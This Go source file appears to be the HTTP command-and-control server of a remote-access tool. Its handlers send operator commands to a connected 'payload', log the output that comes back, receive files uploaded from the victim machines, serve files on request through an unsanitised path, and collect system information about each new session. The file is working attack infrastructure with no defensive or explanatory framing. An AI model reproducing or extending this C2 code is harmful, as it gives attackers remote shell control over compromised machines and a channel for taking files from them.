package server

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
)

// GetCmd handles the /getcmd endpoint and requests a
// cmd from stdin to send to the payload
func GetCmd(w http.ResponseWriter, req *http.Request) {
	if req.Method == http.MethodGet {

		index, isNew := CreateSession(req)

		sessionObj, _ := GetSession(index)

		if isNew {
			cli.Print(
				GreenF("[+] New connection from %s with session id: %d\n", sessionObj.IP, index),
			)
			// if the session is new, get the system information
			fmt.Fprint(w, "__sysinfo__")
		} else {
			fmt.Fprintf(listener.Cfg.VW, "[+] Got request for cmd from session id: %d\n", index)

			sessionObj.Open = true

			var command string

			for {
				select {
				case str := <-sessionObj.Cmd:
					command = str
					fmt.Fprintf(w, command)
				case <-req.Context().Done():
					// get session again for concurrency safety
					index, _ := CreateSession(req)
					sessionObj, _ := GetSession(index)

					cli.Print(RedF("[-] Connection closed from session: %d\n", index))

					sessionObj.Open = false
					w.WriteHeader(444) // 444 - Connection Closed Without Response
				}
				break
			}

			if command == "quit" {
				sessionObj.Open = false
				cli.Printf("[+] Session %d quit.\n", index)
			}
		}
	}
}

// CmdOutput handles the /cmdoutput endpoint and retrieves
// the output of a cmd executed by the payload
func CmdOutput(w http.ResponseWriter, req *http.Request) {
	if req.Method == http.MethodPost {
		body, err := io.ReadAll(req.Body)
		defer req.Body.Close()
		if err != nil {
			cli.Print(RedF("[-] Got error:\n%s\n", err))
			return
		}

		// close connection, the client will open a new one
		w.Header().Set("Connection", "close")
		cli.Printf(
			"[+] Got response from session id %d:\n%s\n",
			FindSessionIndexByToken(req.Header.Get("token")),
			body,
		)
		fmt.Fprintf(w, "Successfully posted output")
	}
}

// FileUpload handles the /upload endpoint.
func FileUpload(w http.ResponseWriter, req *http.Request) {
	// retrieve the file from the request
	file, handler, err := req.FormFile("uploadFile")
	if err != nil {
		cli.Print(RedF("[-] Error retrieving file: %s\n", err))
		return
	}

	// read the file data
	defer file.Close()
	bytes, err := io.ReadAll(file)
	if err != nil {
		cli.Print(RedF("[-] Error reading the uploaded file: %s\n", err))
	}

	// create uploads dir if not existant yet
	_ = os.Mkdir("uploads", 0755)
	// read data into local file
	err = os.WriteFile("uploads/"+handler.Filename, bytes, 0755)
	if err != nil {
		cli.Print(RedF("[-] Error creating and reading into local file: %s\n", err))
	}
	cli.Print(GreenF("[+] Successfully uploaded file"))
	w.Header().Set("Connection", "close")
	fmt.Fprintf(w, "Successfully uploaded file")
}

// FileDownload handles the /download endpoint.
func FileDownload(w http.ResponseWriter, req *http.Request) {
	// get the filename from the request
	filename := req.URL.Query().Get("file")
	if filename == "" {
		cli.Print(RedF("[-] Download request doesn't contain file name"))
		http.Error(w, "no file indicated to download", 400)
		return
	}
	cli.Println("[+] Payload wants to download ", filename)

	// open the file if it exists
	file, err := os.Open(filename)
	defer file.Close()
	if err != nil {
		cli.Print(RedF("[-] Error trying to open file: %s\n", err))
		http.Error(w, "File not found", 404)
		return
	}

	// create header
	fileHeader := make([]byte, 512)
	file.Read(fileHeader)
	fileContentType := http.DetectContentType(fileHeader)
	stats, _ := file.Stat()
	fileSize := strconv.FormatInt(stats.Size(), 10)
	w.Header().Set("Content-Disposition", "attachment; filename="+filename)
	w.Header().Set("Content-Type", fileContentType)
	w.Header().Set("Content-Length", fileSize)

	// reset descriptor offset since we already read 512 bytes
	file.Seek(0, 0)
	// write file into request
	_, err = io.Copy(w, file)
	if err != nil {
		cli.Print(RedF("[-] Error writing file into response: %s\n", err))
		return
	}
	cli.Print(GreenF("[+] Successfully downloaded file\n"))
	w.Header().Set("Connection", "close")
	fmt.Fprintf(w, "Successfully downloaded file")
}

// GetSysinfo handles the /sysinfo endpoint.
func GetSysinfo(w http.ResponseWriter, req *http.Request) {
	if req.Method == "POST" {
		index := FindSessionIndexByToken(req.Header.Get("token"))
		if index == -1 {
			cli.Print(
				RedF(
					"[-] Error while getting session from token: %s\n",
					ErrUnrecognizedSessionToken,
				),
			)
			return
		}
		body, _ := io.ReadAll(req.Body)
		defer req.Body.Close()

		sessionObj, _ := GetSession(index)

		err := json.Unmarshal(body, &sessionObj.SysInfo)
		if err != nil {
			cli.Print(RedF("[-] Error while parsing the JSON system information: %s\n", err))
			return
		}

		w.Header().Set("Connection", "close")
		fmt.Fprintf(w, "Successfully got system information")
	}
}
